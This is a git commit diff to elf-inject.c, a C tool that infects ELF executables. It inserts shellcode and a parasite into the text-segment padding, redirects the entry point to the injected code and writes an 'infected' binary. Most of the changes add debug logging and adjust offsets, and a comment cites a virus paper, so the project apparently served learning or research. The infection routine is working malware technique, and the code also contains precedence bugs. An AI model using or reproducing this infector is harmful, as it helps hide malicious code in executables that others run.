d74df30490fff26009d7b12d204982a8a5b1bc5a
Marcus Ball <marcus.ball@live.com>
2014-12-15 17:43:05 -0500

    ugh why

--- elf-inject.c
+++ elf-inject.c
@@ -55,43 +55,54 @@ int main(int argc, char * argv[]){
 	struct stat stat;
 
 
+  puts("[Info] Opening file to inject...");
 	//open file to be injected for manipulation
 	if((fp = fopen(argv[1],"r")) == NULL)
 		goto file_to_inject_open_error;	
 	
+  puts("[Info] Getting ELF header from file...");
 	//get our elf header
 	if((elf_header = get_elf_header(fp)) == NULL)
 		goto error;
 	
+  puts("[Info] Parsing program headers...");
 	//get elf program headers
 	program_headers = get_elf_program_headers(fp, elf_header);
 	
+  puts("[Info] Parsing section headers...");
 	//get elf section headers
 	section_headers = get_elf_section_headers(fp, elf_header);
 
+  puts("[Info] Getting shellcode...");
+	shellcode = get_shellcode(argv);
 
   fprint_all_headers("headers.orig.debug",elf_header,program_headers,section_headers);
 
 	//In ELF header, increase e_shoff by PAGE_SIZE 
-  puts("[01] Increasing e_shoff by PAGE_SIZE in ELF header...");
+  puts("[Info][01] Increasing e_shoff by PAGE_SIZE in ELF header...");
   int segment_size_increase = PAGE_SIZE;
-  printf("header e_shoff changed from %x to ",elf_header->e_shoff);
+  printf("[Info] header e_shoff changed from %x to ",elf_header->e_shoff);
+  int original_e_shoff = elf_header->e_shoff;
 	elf_header->e_shoff = elf_header->e_shoff + segment_size_increase;
   printf("%x\n",elf_header->e_shoff);
+
+  if(original_e_shoff == elf_header->e_shoff){
+    puts("[Warning] Preserved e_shoff matches increased e_shoff value!");
+  }
 		
 	//patch code to be inserted to jump to original entry point
 	//from the elf header.		
-  puts("[02] Patching parasite to jump to the original entry point...");
+  puts("[Info][02] Patching parasite to jump to the original entry point...");
 	parasite = get_parasite();
-  printf("writing entry point %x to parasite.\n",elf_header->e_entry);
+  printf("[Info] writing entry point %x to parasite.\n",elf_header->e_entry);
 	memcpy(&parasite[32],&elf_header->e_entry, 4);	
 	
 	//Locate the text segment program header	
-  puts("[03] Locating the text segment program header...");
+  puts("[Info][03] Locating the text segment program header...");
   int flag_x = 4;
 	for(int i=0; i < elf_header->e_phnum; i++){
 		if(program_headers[i]->p_type == 1 && program_headers[i]->p_flags & flag_x != 0){
-      printf("using text segment at index %d.\n",i);
+      printf("[Info] using text segment at index %d.\n",i);
 			text_segment_index = i;
 			break;
 		}
@@ -99,23 +110,24 @@ int main(int argc, char * argv[]){
 
   int parasite_length = PARASITE_SIZE + shellcode->size;
 	new_code_address = program_headers[text_segment_index]->p_vaddr + program_headers[text_segment_index]->p_filesz;	
-  int padding_length = segment_size_increase - (new_code_address & (segment_size_increase - 1));
+  int pad_length = segment_size_increase - (new_code_address & (segment_size_increase - 1));
+  int phdrs_length = elf_header->e_phentsize * elf_header->e_phnum;
 
-  print_val("Padding length",padding_length);
+  print_val("parasite_length",parasite_length);
+  print_val("new_code_address",new_code_address);
+  print_val("pad_length",pad_length);
 
-  if(padding_length < parasite_length){
+  if(pad_length < parasite_length){
     puts("Error: Parasite too large!");
     exit(1);
   } 
 
 	//Modify e_entry, in the elf header, to point to new code.
-  puts("[03][a] Modifying entry point of ELF header to point to new code...");
-  printf("elf header entry point changed from %x to ",elf_header->e_entry);
+  puts("[Info][03][a] Modifying entry point of ELF header to point to new code...");
+  printf("[Info] elf header entry point changed from %x to ",elf_header->e_entry);
 	elf_header->e_entry = new_code_address;
   printf("%x.\n",elf_header->e_entry);
 	
-	//get the shellcode we want to insert into memory.
-	shellcode = get_shellcode(argv);
 	
 	
 	//we need the filesz for offset
@@ -127,15 +139,15 @@ int main(int argc, char * argv[]){
 	int new_offset=program_headers[text_segment_index]->p_offset+program_headers[text_segment_index]->p_filesz + PAGE_SIZE;
 
 	//increase p_filesz to account for new code
-  puts("[03][b] Increasing p_filesz by size of new code...");
-  printf("program header filesz changed from %x to ",program_headers[text_segment_index]->p_filesz);
+  puts("[Info][03][b] Increasing p_filesz by size of new code...");
+  printf("[Info] program header filesz changed from %x to ",program_headers[text_segment_index]->p_filesz);
 	unsigned int new_p_filesz = program_headers[text_segment_index]->p_filesz + parasite_length;
 	program_headers[text_segment_index]->p_filesz = new_p_filesz;
   printf("%x.\n",program_headers[text_segment_index]->p_filesz);
 	
 	//increase p_memsz to account for new code
-  puts("[03][c] Increasing p_memsz by size of new code...");
-  printf("program header memsz changed from %x to ",program_headers[text_segment_index]->p_memsz);
+  puts("[Info][03][c] Increasing p_memsz by size of new code...");
+  printf("[Info] program header memsz changed from %x to ",program_headers[text_segment_index]->p_memsz);
 	unsigned int new_p_memsz = program_headers[text_segment_index]->p_memsz + parasite_length;
 	program_headers[text_segment_index]->p_memsz = new_p_memsz;
 	printf("%x.\n",program_headers[text_segment_index]->p_memsz);
@@ -144,13 +156,13 @@ int main(int argc, char * argv[]){
 	//by PAGE_SIZE ???
 	
 	//printf("The offset is 0x%x (%d)\n", offset,offset);
-  puts("[04] For each Phdr who's segment is after the parasite insertion...");
+  puts("[Info][04] For each Phdr who's segment is after the parasite insertion...");
 	for(int i=(text_segment_index+1); i<elf_header->e_phnum; i++){
     //if the program headers come after the section in which the insertion took place...
     if(program_headers[i]->p_offset > parasite_injection_offset){
       //then they need to have their addressed changed to reflect the shift
-      puts("[04][a] Increasing p_offset by increased PAGE_SIZE...");
-      printf("program_header[%d] offset changed from %x to ",i,program_headers[i]->p_offset);
+      puts("[Info][04][a] Increasing p_offset by increased PAGE_SIZE...");
+      printf("[Info] program_header[%d] offset changed from %x to ",i,program_headers[i]->p_offset);
 		  program_headers[i]->p_offset += segment_size_increase;
       printf("%x.\n",program_headers[i]->p_offset);
     }
@@ -165,16 +177,16 @@ int main(int argc, char * argv[]){
 	
 	//For each pphdr who's segment is after the insertion -- increase p_offset
 	//by PAGE_SIZE ???
-  puts("[06] For each Shdr who's section is after the insertion...");
+  puts("[Info][06] For each Shdr who's section is after the insertion...");
 	for(int i=0;i<elf_header->e_shnum; i++){
 		if(section_headers[i]->sh_offset >= parasite_injection_offset){
-      puts("[06][a] Increasing sh_offset by PAGE_SIZE...");
-      printf("section header[%d] changed from %x to ",i,section_headers[i]->sh_offset);
+      puts("[Info][06][a] Increasing sh_offset by PAGE_SIZE...");
+      printf("[Info] section header[%d] changed from %x to ",i,section_headers[i]->sh_offset);
 			section_headers[i]->sh_offset += segment_size_increase;
       printf("%x.\n",section_headers[i]->sh_offset);
 		}
     else if(section_headers[i]->sh_addr + section_headers[i]->sh_size == new_code_address){
-     puts("[05] Increasing sh_len by the parasite length for the last Shdr in the text segment..."); 
+     puts("[Info][05] Increasing sh_len by the parasite length for the last Shdr in the text segment..."); 
      section_headers[i]->sh_size += parasite_length;
     }
     else{
@@ -199,11 +211,11 @@ int main(int argc, char * argv[]){
 	infected = fopen("infected","w");
 	
 	//write the elf header file
-	fwrite(elf_header,1,elf_header->e_ehsize,infected);
+	fwrite(elf_header,elf_header->e_ehsize,1,infected);
 	
 	//write the program headers
 	for(int i=0; i<elf_header->e_phnum; i++){
-    printf("writing program header[%d] (size %d). \n",i,elf_header->e_phentsize);
+    printf("[Info] writing program header[%d] (size %d). \n",i,elf_header->e_phentsize);
 		fwrite(program_headers[i],elf_header->e_phentsize,1,infected);
 	}
 	//copy everything up to where we insert the shellcode	
@@ -216,59 +228,105 @@ int main(int argc, char * argv[]){
 	fflush(fp);
 	fflush(infected);
 	
-	lseek(infected_descriptor, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
+	//lseek(infected_descriptor, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
+	//lseek(infected_descriptor, 0, SEEK_END);
 	lseek(fd, position=elf_header->e_ehsize+(elf_header->e_phentsize*elf_header->e_phnum), SEEK_SET);
-	
-  printf("copying headers to new file...\n");
+	//lseek(fd, position=elf_header->e_ehsize + padding_length, SEEK_SET);
+	lseek(infected_descriptor, position, SEEK_SET);
+
+  //Debug; The latter value is what the wit-virus paper used as lseek pos.
+  /*if(position != (elf_header->e_ehsize + padding_length)){
+    puts("[Warning] Lseek position may be incorrect!");
+  }*/
+  print_val("sizeof(elf_header)",sizeof(elf_header));
+  print_val("elf_header->e_ehsize",elf_header->e_ehsize);
+  print_val("current lseek position",position);
+  print_val("original lseek position",elf_header->e_ehsize + (elf_header->e_phentsize * elf_header->e_phnum));
+  print_val("suspected lseek position",(elf_header->e_ehsize + phdrs_length));
+  print_val("parasite_injection_offset",parasite_injection_offset);
+
+  printf("[Info] copying headers to new file...\n");
 	//printf("-- offset is:%d\n",offset);
 	//printf("-- position is %d\n",position);
 	//printf("-- offset-position is:%d (0x%x)\n",offset-position,offset-position);
   //printf("-- prog_header[]->p_offset + offset - position is: %d\n",(program_headers[text_segment_index]->p_offset + offset) - position);
 	//copy_partial(fd, infected_descriptor, (program_headers[text_segment_index]->p_offset + parasite_injection_offset)-position);
-	copy_partial(fd, infected_descriptor, (original_offset-position));
+	//copy_partial(fd, infected_descriptor, (original_offset-position));
+	copy_partial(fd, infected_descriptor, parasite_injection_offset-position);
 	
 	//insert the shellcode
+  puts("[Info] Writing parasite to file...");
 	write(infected_descriptor,parasite,PARASITE_SIZE);
+  puts("[Info] Writing shellcode to file...");
 	write(infected_descriptor,shellcode->data,shellcode->size);
 	
 	//calculate the amount of garbage we have to insert into the file
-	int garbage_size = PAGE_SIZE-(shellcode->size + PARASITE_SIZE);
+  puts("[Info] Generating garbage bytes...");
+  print_val("segment_size_increase",segment_size_increase);
+  print_val("parasite_length",parasite_length);
+	int garbage_size = segment_size_increase-(parasite_length);
 	char * garbage = (char *) malloc(garbage_size);
 	
-	printf("The garbage size is %d\n",garbage_size);
+	//printf("The garbage size is %d\n",garbage_size);
+  print_val("garbage_size",garbage_size);
 
 	//Use garbage character 0x42 because life the universe and everything.
 	for(int i=0;i<garbage_size;i++){
-		garbage[i] = 'B';
+		garbage[i] = 144; //144 = 0x90, because NOPs.  
 	}
 	
 
 	//write the garbage to the file
-	write(infected_descriptor, garbage, garbage_size);
+  puts("[Info] Writing garbage to file...");
+	if(write(infected_descriptor, garbage, garbage_size) < 0){
+    puts("[Error] Something went wrong while writing garbage to file!");
+  }
 	
 	position += garbage_size;
 
 	//write everything up to section header to file
-	copy_partial(fd, infected_descriptor, elf_header->e_shoff-position);
+  print_val("position",position);
+  print_val("parasite_injection_offset",parasite_injection_offset);
+	print_val("elf_header->e_shoff",elf_header->e_shoff);
+  print_val("original_e_shoff",original_e_shoff);
+  //copy_partial(fd, infected_descriptor, elf_header->e_shoff-position);
+	//copy_partial(fd, infected_descriptor, elf_header->e_shoff-parasite_injection_offset);
+	copy_partial(fd, infected_descriptor, original_e_shoff-parasite_injection_offset);
 
 	//write the section headers to the file
 	for(int i=0;i<elf_header->e_shnum; i++){
-		write(infected_descriptor, section_headers[i], elf_header->e_shentsize);
+		int written = write(infected_descriptor, section_headers[i], elf_header->e_shentsize);
+    if(written == -1){
+      puts("[Error] Something went wrong while writing section headers!");
+    }
+    else if(written != elf_header->e_shentsize){
+      printf("[Error] Number of written bytes %d not equal to section header size %d!\n",written,elf_header->e_shentsize);
+    }
+    else{
+      printf("[Info] Section header %d written.\n",i);
+    }
 	}
 	
-	if(lseek(fd, position+(elf_header->e_shentsize*elf_header->e_shnum),SEEK_SET)<0){
-		puts("LSEEK ERROR");
+  print_val("old lseek pos: position+(e_shentsize * e_shnum)",position+(elf_header->e_shentsize * elf_header->e_shnum));
+  print_val("new lseek pos: original_e_shoff + (e_shentsize * e_shnum)",original_e_shoff + (elf_header->e_shentsize * elf_header->e_shnum));
+	//if(lseek(fd, position+(elf_header->e_shentsize*elf_header->e_shnum),SEEK_SET)<0){
+	int saved_seek;
+  if(saved_seek = lseek(fd, position = original_e_shoff + (elf_header->e_shentsize * elf_header->e_shnum),SEEK_SET)<0){
+		puts("[Error] lseek error!");
 	}
+  print_val("position",position);
 	
-	int old_fd = fd;
-    int fd_filesize = lseek(fd,0,SEEK_END);
-	printf("The filesize is, %d", fd_filesize);
+	//int old_fd = fd;
+  int fd_filesize = lseek(fd,0,SEEK_END);
+  print_val("filesize",fd_filesize);
+
+  lseek(fd,saved_seek,SEEK_SET); //Reposition to the previous seek
 
 	//write everything to end of file	
-	puts("or here?");
-	copy_partial(old_fd, infected_descriptor, fd_filesize-position);
+  puts("[Info] Writing remaining data to file...");
+	copy_partial(fd, infected_descriptor, fd_filesize-position);
 	
-
+  puts("[Info] Done.");
 	return 0;
 	
 
@@ -448,10 +506,10 @@ void copy_partial(int fd, int od, unsigned int len){
 }
 
 void print_val(char *  name, int val){
-  printf("%s = %d (0x%x)\n",name,val,val);
+  printf("[Info] %s = %d (0x%x)\n",name,val,val);
 }
 void print_char_val(char * name, unsigned char * val){
-  printf("%s = %s\n",name,val);
+  printf("[Info] %s = %s\n",name,val);
 }
 
 void print_elf_headers(Elf32_Ehdr * ehdr){
